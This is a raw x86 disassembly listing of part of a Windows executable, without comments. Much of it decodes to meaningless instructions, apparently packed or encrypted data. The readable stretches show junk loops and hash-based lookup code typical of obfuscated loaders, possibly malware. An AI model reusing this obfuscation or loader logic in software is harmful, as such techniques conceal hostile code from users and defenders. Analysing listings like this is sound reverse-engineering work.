  40ea54:	push   edx
  40ea55:	aad    0xb0
  40ea57:	adc    bl,bl
  40ea59:	dec    ebp
  40ea5a:	or     DWORD PTR [edi-0x1da2efbf],eax
  40ea60:	xor    DWORD PTR [edi+ebx*1-0x7e226934],edx
  40ea67:	sub    bl,0xd9
  40ea6a:	rcr    DWORD PTR [edi-0x5a],1
  40ea6d:	aam    0x86
  40ea6f:	sub    eax,0x41b5c538
  40ea74:	cmp    ax,0xaaa2
  40ea78:	push   ss
  40ea79:	pop    edi
  40ea7a:	fild   WORD PTR [eax]
  40ea7c:	push   ss
  40ea7d:	push   cs
  40ea7e:	inc    ebp
  40ea7f:	int3   
  40ea80:	push   ecx
  40ea81:	push   ebp
  40ea82:	mov    esi,0xc3ee409
  40ea87:	outs   dx,BYTE PTR ds:[esi]
  40ea88:	(bad)  
  40ea89:	rcr    dh,1
  40ea8b:	pop    esi
  40ea8c:	shl    BYTE PTR [edx+eiz*1-0x37],cl
  40ea90:	bnd jmp 0x40eace
  40ea93:	fwait
  40ea94:	mov    ds,eax
  40ea96:	call   0xa90:0x1d7987b6
  40ea9d:	ins    DWORD PTR es:[edi],dx
  40ea9e:	xor    al,0xfa
  40eaa0:	jnp    0x40ea50
  40eaa2:	and    eax,esp
  40eaa4:	mov    al,ds:0x6578b4f3
  40eaa9:	test   al,0x78
  40eaab:	stos   BYTE PTR es:[edi],al
  40eaac:	inc    edi
  40eaad:	sbb    DWORD PTR [esi],edi
  40eaaf:	div    DWORD PTR ds:0xaac6d513
  40eab5:	inc    esp
  40eab6:	test   DWORD PTR [ebx],0xda7484
  40eabc:	sar    BYTE PTR [ecx+0x353bf86],cl
  40eac2:	ret    
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433813,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433813,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433813,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433813,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433813
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433813,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433813
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433813,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433853,0x16
  40eb34:	cmp    DWORD PTR ds:0x433853,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433853,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433853
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433853,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433863,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43381b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4338ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dh,BYTE PTR [edi-0x6584f9dc]
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ebfe
  40ebc0:	jle    0x40eb93
  40ebc2:	ror    BYTE PTR [ebp-0x77],cl
  40ebc5:	add    ch,cl
  40ebc7:	out    dx,al
  40ebc8:	sbb    eax,0x89253d3b
  40ebcd:	dec    esi
  40ebce:	rcl    DWORD PTR [ecx-0x66a9a00a],1
  40ebd4:	popa   
  40ebd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebd6:	sub    BYTE PTR [eax-0x6d],cl
  40ebd9:	xchg   eax,edx
  40ebdb:	mov    ecx,0x3805a573
  40ebe0:	ror    BYTE PTR [edi],cl
  40ebe2:	push   ds
  40ebe3:	(bad)  
  40ebe4:	adc    cl,BYTE PTR [eax-0x1a]
  40ebe7:	stc    
  40ebe8:	aam    0x76
  40ebea:	enter  0xc252,0xb8
  40ebee:	out    dx,al
  40ebef:	mov    ebx,esp
  40ebf1:	pop    edi
  40ebf2:	retf   0x5d9c
  40ebf5:	shl    BYTE PTR [ecx+eiz*1+0x75],cl
  40ebf9:	aad    0xf5
  40ebfb:	loope  0x40ec0b
  40ebfd:	ja     0x40ec28
  40ebff:	adc    esp,edi
  40ec01:	sub    esp,edx
  40ec03:	cwde   
  40ec04:	mov    bh,0x82
  40ec06:	jbe    0x40ebc8
  40ec08:	ret    
  40ec09:	fidiv  DWORD PTR [ebx+0x7e]
  40ec0c:	sbb    al,BYTE PTR [esi*4+0x2acabb0d]
  40ec13:	rol    DWORD PTR [ebp+0x4deb1e71],cl
  40ec19:	adc    eax,0xdcc062a5
  40ec1e:	push   ebx
  40ec1f:	xchg   edi,eax
  40ec20:	sub    DWORD PTR [ebp+0x36],esi
  40ec23:	not    esi
  40ec25:	pop    eax
  40ec26:	mov    esi,0x6ad2348
  40ec2b:	fisttp WORD PTR [ebx-0x46]
  40ec2e:	inc    ebp
  40ec2f:	mov    ds:0x4be0a8e1,al
  40ec34:	sahf   
  40ec35:	call   0xe67b:0xcfdc496a
  40ec3c:	mov    ch,0xcc
  40ec3e:	add    DWORD PTR [ebx],esi
  40ec40:	mov    edi,0xf868d911
  40ec45:	adc    ecx,eax
  40ec47:	push   eax
  40ec48:	in     eax,0x11
  40ec4a:	push   cs
  40ec4b:	jl     0x40ec74
  40ec4d:	mov    fs,WORD PTR [eax+eax*8-0x4c5286f1]
  40ec54:	scas   al,BYTE PTR es:[edi]
  40ec55:	dec    esp
  40ec56:	xor    al,0xd8
  40ec58:	xchg   ecx,eax
  40ec59:	pop    es
  40ec5a:	(bad)  
  40ec5b:	sub    BYTE PTR [esi+0x54],bl
  40ec5e:	sbb    al,0x5d
  40ec60:	sub    BYTE PTR [ebx],bh
  40ec62:	jno    0x40ecdc
  40ec64:	repz out 0x49,eax
  40ec67:	ret    0xdadd
  40ec6a:	add    ecx,eax
  40ec6c:	sahf   
  40ec6d:	jne    0x40ec85
  40ec6f:	je     0x40eccd
  40ec71:	dec    ebx
  40ec72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec73:	mov    ch,BYTE PTR [esi-0x50c0f2b4]
  40ec79:	mov    bh,0xbc
  40ec7b:	test   DWORD PTR [ebx+0x33ad033d],ecx
  40ec81:	or     al,0x2c
  40ec83:	or     eax,0xf078f089
  40ec88:	pop    es
  40ec89:	mov    ah,0xf8
  40ec8b:	ins    BYTE PTR es:[edi],dx
  40ec8c:	data16 in al,0x64
  40ec8f:	test   eax,0x40db00f1
  40ec94:	add    dh,bh
  40ec96:	(bad)  
  40ec97:	dec    esp
  40ec98:	arpl   WORD PTR [edx-0x6a4891e9],bx
  40ec9e:	das    
  40ec9f:	push   0xffffffa9
  40eca1:	mov    ebp,0xb8fff49f
  40eca6:	jbe    0x40ec35
  40eca8:	ror    DWORD PTR [ecx],cl
  40ecaa:	lea    esi,[esi-0x6b59c9c9]
  40ecb0:	je     0x40ecd3
  40ecb2:	cmp    al,0x7d
  40ecb4:	jno    0x40ecfc
  40ecb6:	cli    
  40ecb7:	push   es
  40ecb8:	ins    BYTE PTR es:[edi],dx
  40ecb9:	jns    0x40ec4f
  40ecbb:	repz push ebp
  40ecbd:	xor    eax,0xfa86422c
  40ecc2:	adc    DWORD PTR [ebp+0x64],0x63
  40ecc6:	mov    edx,0x3fd4757f
  40eccb:	or     al,0xb6
  40eccd:	ret    
  40ecce:	pop    edi
  40eccf:	repz pop esp
  40ecd1:	enter  0xfbd3,0x2f
  40ecd5:	jnp    0x40ecd2
  40ecd7:	imul   edi,DWORD PTR [esi+0x1e57ba0c],0xf8cdae70
  40ece1:	lea    ecx,[eax+0xc9cadc9]
  40ece7:	in     al,dx
  40ece8:	bnd cs js 0x40eca6
  40ecec:	mov    dh,0xda
  40ecee:	out    0xd4,al
  40ecf0:	shl    BYTE PTR [edx],cl
  40ecf2:	mov    esi,0xa8147cac
  40ecf7:	lea    esp,[ecx+0x5d]
  40ecfa:	xchg   ebp,eax
  40ecfb:	ins    DWORD PTR es:[edi],dx
  40ecfc:	sub    DWORD PTR [ebp+0x21ba9604],ebx
  40ed02:	ror    DWORD PTR [edi+0x3cac9761],1
  40ed08:	mov    ds:0x7d2e4874,eax
  40ed0d:	xchg   DWORD PTR [eax-0x48b940f4],edx
  40ed13:	jg     0x40ed79
  40ed15:	push   0x80b288d1
  40ed1a:	fnstsw WORD PTR [edx]
  40ed1c:	inc    BYTE PTR [ebx+ebp*1]
  40ed1f:	outs   dx,DWORD PTR ds:[esi]
  40ed20:	mov    cl,0x53
  40ed22:	cmp    al,0x9b
  40ed24:	(bad)  
  40ed26:	dec    esp
  40ed28:	sbb    edi,DWORD PTR [eax+0x2a8920ce]
  40ed2e:	mov    ebx,0x6992f5b2
  40ed33:	and    cl,BYTE PTR [ebp-0x5a]
  40ed36:	and    dh,dl
  40ed38:	shl    BYTE PTR [edi*2-0x24755457],cl
  40ed3f:	loope  0x40ed89
  40ed41:	add    BYTE PTR [ecx+edi*8-0x2fc51934],al
  40ed48:	nop
  40ed49:	ds std 
  40ed4b:	(bad)  
  40ed4c:	in     al,0xc4
  40ed4e:	cwde   
  40ed4f:	jecxz  0x40edcf
  40ed51:	cmp    BYTE PTR [esi-0xd],ah
  40ed54:	mov    ds:0x68c0b972,al
  40ed59:	jae    0x40ed32
  40ed5b:	mov    ds:0x772904fe,eax
  40ed60:	jb     0x40ed4c
  40ed62:	ins    DWORD PTR es:[edi],dx
  40ed63:	popa   
  40ed64:	test   al,0x83
  40ed66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed67:	adc    ebx,DWORD PTR [edx]
  40ed69:	jb     0x40edd2
  40ed6b:	in     al,0x68
  40ed6d:	dec    ebx
  40ed6e:	mov    esi,DWORD PTR [edx]
  40ed70:	adc    DWORD PTR [ecx-0x77ecaf8c],ebp
  40ed76:	gs cmp al,0x66
  40ed79:	mov    eax,ds:0xc2c1ed68
  40ed7e:	hlt    
  40ed7f:	mov    eax,DWORD PTR [edi-0x7afd1872]
  40ed85:	shl    DWORD PTR ds:0xe8ea1dce,0xc0
  40ed8c:	jo     0x40ee07
  40ed8e:	push   esp
  40ed8f:	pop    ss
  40ed90:	or     ah,ch
  40ed92:	popa   
  40ed93:	in     al,0xff
  40ed95:	and    BYTE PTR [ebx+eax*8+0x2bc233ea],dh
  40ed9c:	or     eax,0x4337d3
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x433853,0x18
  40edad:	cmp    DWORD PTR ds:0x433853,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433853,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433853
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433853,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x6dcee218]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	out    0xdb,al
  40ee78:	test   BYTE PTR [edi-0x218e4b25],dh
  40ee7e:	pop    ecx
  40ee7f:	pop    edx
  40ee80:	pop    ecx
  40ee81:	cwde   
  40ee82:	inc    esp
  40ee83:	das    
  40ee84:	out    dx,eax
  40ee85:	sbb    ah,dl
  40ee87:	mov    eax,0x5c9c3716
  40ee8c:	mov    al,0x27
  40ee8e:	(bad)  
  40ee8f:	cmp    eax,0x54c25ce1
  40ee94:	pushf  
  40ee95:	cs pop ds
  40ee97:	mov    bl,0xa5
  40ee99:	pop    es
  40ee9a:	fadd   st(4),st
  40ee9c:	retf   
  40ee9d:	jmp    0x84e7:0x5fef4b2d
  40eea4:	mov    WORD PTR [edi-0xe],?
  40eea7:	fadd   DWORD PTR [eax]
  40eea9:	and    ch,BYTE PTR [ebx]
  40eeab:	inc    eax
  40eeac:	jmp    0x40eeea
  40eeae:	outs   dx,DWORD PTR ds:[esi]
  40eeaf:	jnp    0x40ee9b
  40eeb1:	ror    DWORD PTR [ecx+0x5f],cl
  40eeb4:	retf   0xe507
  40eeb7:	sub    DWORD PTR [ecx-0x17],eax
  40eeba:	mov    ds:0x594781fe,eax
  40eebf:	mov    eax,ds:0xc914d5d9
  40eec4:	push   0x35
  40eec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eec7:	push   ebx
  40eec8:	aam    0x45
  40eeca:	jb     0x40eec0
  40eecc:	mov    bl,BYTE PTR [edx]
  40eece:	outs   dx,DWORD PTR ds:[esi]
  40eecf:	sahf   
  40eed0:	mov    bh,0xa5
  40eed2:	fnstenv [ebx+0x134d66a1]
  40eed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eed9:	jo     0x40ef4c
  40eedb:	fld    TBYTE PTR [edx]
  40eedd:	(bad)  
  40eede:	mov    al,0xf4
  40eee0:	adc    bl,BYTE PTR [ebx+0x8]
  40eee3:	dec    eax
  40eee4:	pusha  
  40eee5:	or     bh,dh
  40eee7:	test   eax,0x30d65b18
  40eeec:	mov    eax,ds:0x18988a31
  40eef1:	(bad)  
  40eef2:	(bad)  
  40eef4:	aaa    
  40eef5:	call   0xc5114d74
  40eefa:	jg     0x40eeb6
  40eefc:	hlt    
  40eefd:	mov    ch,0x59
  40eeff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef00:	pop    ebp
  40ef01:	sub    eax,0xd9fdd978
  40ef06:	push   eax
  40ef07:	jno    0x40eeaf
  40ef09:	fst    DWORD PTR [esi-0x2d0cf5f1]
  40ef0f:	out    dx,al
  40ef10:	mov    al,0x47
  40ef12:	retf   
  40ef13:	sub    eax,0x83bbccb6
  40ef18:	xchg   BYTE PTR [ebp+0x6b3c8744],cl
  40ef1e:	push   cs
  40ef1f:	xlat   BYTE PTR ds:[ebx]
  40ef20:	mov    ah,0xe1
  40ef22:	dec    esi
  40ef23:	adc    ah,bl
  40ef25:	push   ds
  40ef26:	ret    0x3d05
  40ef29:	lea    ebp,[ecx]
  40ef2b:	sub    edi,DWORD PTR [eax]
  40ef2d:	(bad)  
  40ef2f:	mov    ch,0xb4
  40ef31:	dec    edx
  40ef32:	out    0xd2,eax
  40ef34:	jmp    0x40eeb8
  40ef36:	push   cs
  40ef37:	mov    dh,0x87
  40ef39:	and    esi,DWORD PTR [esi]
  40ef3b:	pop    ebp
  40ef3c:	not    BYTE PTR [eax]
  40ef3e:	and    BYTE PTR [esi],bl
  40ef40:	push   eax
  40ef41:	sub    eax,0x7a1ead5b
  40ef46:	and    dh,BYTE PTR [edi]
  40ef48:	add    ebx,DWORD PTR [esi-0x7bfac9c2]
  40ef4e:	xchg   edx,eax
  40ef4f:	ins    BYTE PTR es:[edi],dx
  40ef50:	push   ecx
  40ef51:	ins    DWORD PTR es:[edi],dx
  40ef52:	ins    BYTE PTR es:[edi],dx
  40ef53:	inc    DWORD PTR [ecx-0x58]
  40ef56:	push   edi
  40ef57:	(bad)  
  40ef58:	or     esi,edi
  40ef5a:	iret   
  40ef5b:	dec    eax
  40ef5c:	push   ss
  40ef5d:	mov    eax,ds:0x4faa5666
  40ef62:	mov    dl,0x68
  40ef64:	mov    esi,0xcd23a9bc
  40ef69:	fs aaa 
  40ef6b:	inc    esi
  40ef6c:	cmp    dl,cl
  40ef6e:	and    dh,BYTE PTR ds:0x3da37628
  40ef74:	outs   dx,DWORD PTR ds:[esi]
  40ef75:	adc    esi,DWORD PTR [esi+edx*1-0x30aec734]
  40ef7c:	es adc ebp,ebx
  40ef7f:	adc    bl,BYTE PTR [ebx-0xb3ce087]
  40ef85:	mov    eax,0x1f20e264
  40ef8a:	dec    esp
  40ef8b:	scas   al,BYTE PTR es:[edi]
  40ef8c:	push   eax
  40ef8d:	sbb    BYTE PTR [ebx-0x642a6dbd],cl
  40ef93:	lds    eax,FWORD PTR [ebp+0x57ee99f2]
  40ef99:	xor    dl,al
  40ef9b:	loope  0x40ef53
  40ef9d:	xlat   BYTE PTR ds:[ebx]
  40ef9e:	pop    ebx
  40ef9f:	cmp    ecx,DWORD PTR [ecx+edx*4]
  40efa2:	jbe    0x40efea
  40efa4:	xchg   DWORD PTR [esi-0x497bcf6c],edi
  40efaa:	or     ebp,ecx
  40efac:	inc    ecx
  40efad:	jno    0x40efc8
  40efaf:	lods   eax,DWORD PTR ds:[esi]
  40efb0:	fwait
  40efb1:	inc    ebx
  40efb2:	adc    eax,0x95b26a5d
  40efb7:	fld    DWORD PTR [esi]
  40efb9:	iret   
  40efba:	sub    dh,BYTE PTR [ebp-0x3b]
  40efbd:	jne    0x40ef78
  40efbf:	and    ah,BYTE PTR [edi-0x6c]
  40efc2:	mov    BYTE PTR [esi-0x6d],bh
  40efc5:	sbb    DWORD PTR [ebx+0x4],0x3b638d57
  40efcc:	mov    esi,0x5f0521e4
  40efd1:	sub    ebx,DWORD PTR [edx+0x43]
  40efd4:	pop    ds
  40efd5:	mov    WORD PTR [edi+0x54e11ac4],gs
  40efdb:	add    eax,0xa3f295d6
  40efe0:	add    eax,0x60a5ba9f
  40efe5:	or     edx,edx
  40efe7:	and    eax,DWORD PTR [ecx-0x455d78fb]
  40efed:	popa   
  40efee:	mov    ecx,0x71c40531
  40eff3:	cld    
  40eff4:	arpl   WORD PTR [edi+0x30],ax
  40eff7:	mov    BYTE PTR [ebp-0x36],dh
  40effa:	jo     0x40f02a
  40effc:	and    bl,al
  40effe:	jb     0x40efd1
  40f000:	mov    eax,ds:0xc9fd69e2
  40f005:	jmp    0x11d5:0xc8890775
  40f00c:	mov    ebx,0xf1551bfc
  40f011:	popf   
  40f012:	loope  0x40f034
  40f014:	sub    BYTE PTR [esi-0x3668823f],bl
  40f01a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f01b:	pusha  
  40f01c:	dec    edx
  40f01d:	sub    ch,BYTE PTR cs:[ebx+0x30]
  40f021:	pusha  
  40f022:	popa   
  40f023:	frstor [ebx+0x1e23ae0a]
  40f029:	and    eax,0xa5cbf564
  40f02e:	(bad)  
  40f02f:	icebp  
  40f030:	daa    
  40f031:	push   cs
  40f032:	es jne 0x40f04b
  40f035:	and    BYTE PTR [edx],cl
  40f037:	ror    BYTE PTR [edi],0x88
  40f03a:	or     edi,DWORD PTR [edx+0x43203b76]
  40f040:	test   DWORD PTR [edi],esp
  40f042:	je     0x40efe8
  40f044:	jecxz  0x40f0be
  40f046:	(bad)  
  40f047:	pop    esi
  40f048:	xchg   edi,eax
  40f049:	jg     0x40f026
  40f04b:	icebp  
  40f04c:	fcomp  QWORD PTR [ecx]
  40f04e:	hlt    
  40f04f:	or     BYTE PTR [ebx-0x36a1f3bb],0xc2
  40f056:	or     BYTE PTR [eax],al
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43381b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xddce1594,ebx
  40f076:	sbb    ebx,DWORD PTR [ebx]
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	jp     0x40f025
  40f082:	xor    DWORD PTR [edx+0x5a726d6d],0x81dd17f0
  40f08c:	aaa    
  40f08d:	nop
  40f08e:	jne    0x40f02d
  40f090:	stos   BYTE PTR es:[edi],al
  40f091:	ror    dh,1
  40f093:	popa   
  40f094:	dec    eax
  40f095:	or     eax,0x2ee0e7ef
  40f09a:	xchg   DWORD PTR [esi+0x5a7bea2f],esp
  40f0a0:	pop    esp
  40f0a1:	jg     0x40f0e7
  40f0a3:	xchg   esp,eax
  40f0a4:	mov    bl,0x88
  40f0a6:	mov    esp,0x8c4925b0
  40f0ab:	(bad)  
  40f0ad:	mov    esp,0xc8d3c59b
  40f0b2:	leave  
  40f0b3:	jmp    0xc8306ec6
  40f0b8:	rcr    dh,cl
  40f0ba:	or     BYTE PTR [eax+0xaa81529],0xa7
  40f0c1:	out    dx,eax
  40f0c2:	mov    DWORD PTR ds:0x6c5353af,edx
  40f0c8:	push   esi
  40f0c9:	sbb    al,0x79
  40f0cb:	jl     0x40f087
  40f0cd:	out    0xe3,al
  40f0cf:	cdq    
  40f0d0:	fistp  QWORD PTR [edx-0x574c50c6]
  40f0d6:	or     DWORD PTR [esi+esi*2+0x49a59026],0x46576cc2
  40f0e1:	shl    BYTE PTR [edx],1
  40f0e3:	ja     0x40f093
  40f0e5:	mov    al,ds:0x67de041e
  40f0ea:	div    DWORD PTR ds:0xabda9896
  40f0f0:	fwait
  40f0f1:	mov    ah,0xb1
  40f0f3:	jmp    0x9c17:0x4a8ae911
  40f0fa:	fucomi st,st(3)
  40f0fc:	jmp    0xb025f9ad
  40f101:	sub    al,0x38
  40f103:	mov    dl,0x6b
  40f105:	int3   
  40f106:	jmp    0xfed89127
  40f10b:	add    DWORD PTR [edi+0x73],edi
  40f10e:	outs   dx,BYTE PTR ds:[esi]
  40f10f:	and    al,0x8f
  40f111:	sub    eax,0x1e32380f
  40f116:	inc    eax
  40f117:	push   ebx
  40f118:	mov    bh,0x8f
  40f11a:	jl     0x40f19b
  40f11c:	mov    ebx,0xe39b46b7
  40f121:	cs adc eax,0x5d0df3f8
  40f127:	dec    eax
  40f128:	lods   al,BYTE PTR ds:[esi]
  40f129:	jmp    0x40f114
  40f12b:	pop    ebx
  40f12c:	jnp    0x40f130
  40f12e:	push   eax
  40f12f:	inc    edi
  40f130:	inc    edx
  40f131:	sbb    edi,DWORD PTR [esp+edi*4+0x1c]
  40f135:	cmp    al,0xa6
  40f137:	dec    ebx
  40f138:	call   0x3cd8d1cc
  40f13d:	xchg   edi,eax
  40f13e:	pop    esp
  40f13f:	mov    al,ds:0x42c90e20
  40f144:	xchg   DWORD PTR [edx-0xb4f3df0],ebp
  40f14a:	xchg   edx,eax
  40f14b:	push   0x7d
  40f14d:	gs xchg ecx,eax
  40f14f:	push   esp
  40f150:	push   esp
  40f151:	int    0x8d
  40f153:	push   ebp
  40f154:	jbe    0x40f0d8
  40f156:	mov    BYTE PTR [esi-0x573b6ce7],bh
  40f15c:	jae    0x40f0e7
  40f15e:	xchg   ebp,eax
  40f15f:	aad    0x24
  40f161:	push   ebx
  40f162:	std    
  40f163:	ja     0x40f1b4
  40f165:	jmp    0xeb67:0x414133b7
  40f16c:	les    ebp,FWORD PTR [ebx]
  40f16e:	adc    BYTE PTR [ebp+0x28],0xb4
  40f172:	cmp    dh,cl
  40f174:	fild   WORD PTR [eax]
  40f176:	dec    DWORD PTR [ebx]
  40f178:	or     ebp,DWORD PTR [esi+0x1581de38]
  40f17e:	or     al,0xc4
  40f180:	adc    al,0x38
  40f182:	dec    eax
  40f183:	jo     0x40f136
  40f185:	or     eax,0xe6430e86
  40f18a:	stos   DWORD PTR es:[edi],eax
  40f18b:	and    edi,DWORD PTR [esi+0x3b]
  40f18e:	adc    BYTE PTR [ebp+0x5bf12d06],0x3a
  40f195:	dec    ebx
  40f196:	test   DWORD PTR [ebx-0x6e],esi
  40f199:	out    dx,al
  40f19a:	aam    0x26
  40f19c:	les    ecx,FWORD PTR [ebp-0x2]
  40f19f:	test   al,0xcc
  40f1a1:	pusha  
  40f1a2:	fidiv  WORD PTR [ebx]
  40f1a4:	in     eax,dx
  40f1a5:	shl    BYTE PTR [edx],0xf0
  40f1a8:	scas   al,BYTE PTR es:[edi]
  40f1a9:	rol    BYTE PTR ds:0xf6fa6c06,cl
  40f1af:	pop    ecx
  40f1b0:	adc    DWORD PTR [ecx],eax
  40f1b2:	pop    es
  40f1b3:	(bad)  
  40f1b4:	xor    DWORD PTR [edi+edi*4],ebx
  40f1b7:	xor    eax,eax
  40f1b9:	mov    al,0xe2
  40f1bb:	jne    0x40f1b7
  40f1bd:	call   0xf985:0xbea1a947
  40f1c4:	lods   eax,DWORD PTR gs:[esi]
  40f1c6:	mov    ah,0x56
  40f1c8:	add    BYTE PTR [ebx-0x1ea28185],bh
  40f1ce:	inc    esp
  40f1cf:	or     DWORD PTR [ecx+esi*1],ebx
  40f1d2:	scas   eax,DWORD PTR es:[edi]
  40f1d3:	ja     0x40f169
  40f1d5:	js     0x40f193
  40f1d7:	add    eax,0xffffffbf
  40f1da:	add    esp,edi
  40f1dc:	pop    ds
  40f1dd:	ss nop
  40f1df:	mov    DWORD PTR [edi],edi
  40f1e1:	nop
  40f1e2:	xchg   DWORD PTR [eax],ecx
  40f1e4:	xchg   ebx,eax
  40f1e5:	ret    
  40f1e6:	aas    
  40f1e7:	cmp    esp,DWORD PTR [ebx]
  40f1e9:	xlat   BYTE PTR ds:[ebx]
  40f1ea:	pop    esp
  40f1eb:	mov    ah,BYTE PTR [edi]
  40f1ed:	pop    ss
  40f1ee:	cmp    BYTE PTR [ebp-0x4e],ah
  40f1f1:	inc    esi
  40f1f2:	xchg   esp,eax
  40f1f3:	add    eax,DWORD PTR [ecx-0x67]
  40f1f6:	int    0x64
  40f1f8:	xchg   BYTE PTR [ecx-0xe],bl
  40f1fb:	call   0xaf68:0x612560e4
  40f202:	xchg   ebp,eax
  40f203:	mov    dh,0x68
  40f205:	lods   al,BYTE PTR ds:[esi]
  40f206:	je     0x40f252
  40f208:	mov    ecx,0xad8b76ae
  40f20d:	in     al,0x52
  40f20f:	mov    edx,0x7f263aa1
  40f214:	sbb    ah,BYTE PTR [ebp+0x2deed8c5]
  40f21a:	jae    0x40f23a
  40f21c:	fdivrp st(6),st
  40f21e:	shl    DWORD PTR [eax],cl
  40f220:	std    
  40f221:	mov    eax,0x189b723c
  40f226:	ret    0xf267
  40f229:	push   cs
  40f22a:	mov    dh,0xc9
  40f22c:	adc    esi,DWORD PTR [ecx]
  40f22e:	std    
  40f22f:	and    eax,0xd89e4e70
  40f234:	jno    0x40f1fd
  40f236:	(bad)  
  40f237:	xor    al,BYTE PTR [edx-0x24]
  40f23a:	jae    0x40f1c1
  40f23c:	inc    eax
  40f23d:	(bad)  
  40f23e:	dec    ebx
  40f23f:	xchg   edx,eax
  40f240:	cmp    eax,0x874cd441
  40f245:	les    esi,FWORD PTR [eax+0x1821d235]
  40f24b:	inc    esi
  40f24c:	fwait
  40f24d:	in     al,0xf1
  40f24f:	cmp    al,bh
  40f251:	lahf   
  40f252:	jno    0x40f1f5
  40f254:	sub    ch,BYTE PTR [ebx+0x67]
  40f257:	and    al,0x1f
  40f259:	jnp    0x40f262
  40f25b:	ret    
  40f25c:	nop
